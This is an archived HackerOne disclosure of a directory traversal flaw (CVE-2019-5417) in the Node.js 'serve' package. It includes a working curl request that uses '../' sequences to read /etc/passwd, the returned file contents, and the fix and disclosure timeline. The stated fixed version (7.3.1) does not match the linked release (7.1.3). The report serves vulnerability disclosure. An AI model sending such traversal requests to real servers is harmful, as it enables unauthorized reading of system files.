---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/path-traversal
  - env/web
  - stack/node
  - vuln/path-traversal
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2018-07-02
submitted: 2018-05-29T06:04:10.003Z
bounty_usd: null
votes: 6
cve: "CVE-2019-5417"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "tungpun"
source: "https://hackerone.com/reports/358645"
title: "[serve] Server Directory Traversal"
---
# [serve] Server Directory Traversal

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 6 | **Program:** Node.js third-party modules | **Disclosed:** 2018-07-02

- Report: [https://hackerone.com/reports/358645](https://hackerone.com/reports/358645)
- CWE: Path Traversal | CVE: CVE-2019-5417
- Submitted: 2018-05-29T06:04:10.003Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report a Server Directory Traversal vulnerability in **serve**.
It allows reading local files on the target server.

# Module

**module name:** serve
**version:** 7.0.1
**npm page:** https://www.npmjs.com/package/serve

## Module Description

*Assuming you would like to serve a static site, single page application or just a static file (no matter if on your device or on the local network), this package is just the right choice for you.*

*It behaves exactly like static deployments on Now, so it's perfect for developing your static project. Then, when it's time to push it into production, you deploy it.*

*Furthermore, it also provides a neat interface for listing the directory's contents*

# Vulnerability

## Steps To Reproduce:

* Install the module

`$ npm i serve`

* Start the server

`$ ./node_modules/serve/bin/serve.js`

* Using the below request to access the file `/etc/passwd` on the target server:

```
$ curl --path-as-is 'http://127.0.0.1:3000/../../../../../../etc/passwd'
##
# User Database
#
# Note that this file is consulted directly only when the system is running
# in single-user mode.  At other times this information is provided by
# Open Directory.
#
# See the opendirectoryd(8) man page for additional information about
# Open Directory.
##
nobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false
root:*:0:0:System Administrator:/var/root:/bin/sh
daemon:*:1:1:System Services:/var/root:/usr/bin/false
...
```

## Supporting Material/References:

* macOS High Sierra 10.13.4
* node v8.10.0
* npm 6.1.0
* curl 7.54.0

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

It allows reading local files on the target server

## Timeline

- **Report Filed**
- **Report Triaged**
- **External User Joined**
- **2018-05-30** @notquiteleo: Hey! Thanks for reporting this issue.

It's now fixed as of serve 7.3.1: https://github.com/zeit/serve/releases/tag/7.1.3
- **2018-05-31** @tungpun: Great! I tried again and can't reproduce the issue anymore.
- **2018-06-23** @tungpun: Hi there,

As this one has been fixed, could you kindly close this report and assign a CVE?
- **2018-07-02** @tungpun: HI all,
May I know any update?
- **2018-07-02** @marcinhoppe: @tungpun Sorry for the delay. I will disclose it now.
- **Report Resolved**
- **Agreed On Going Public**
- **Report Severity Updated**
- **Manually Disclosed**
